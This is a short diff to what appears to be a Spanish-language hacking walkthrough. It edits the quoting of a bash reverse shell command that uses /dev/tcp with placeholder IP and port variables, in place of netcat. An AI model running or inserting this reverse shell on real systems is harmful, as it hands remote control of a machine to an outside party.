@@ -330,7 +330,7 @@ vamos a remplazar el `netcat` por un `bash -c`
 
 `reverse shell en bash`
 ```python
-bash -c "bash -i >& /dev/tcp/{0}/{1} 0>&1"
+"bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1'"
 ```
 
 básicamente debemos agregar una reverse shell en bash y agregando las variables `{0}/{1}` las cuales hacen referencia a la dirección ip y el puerto.
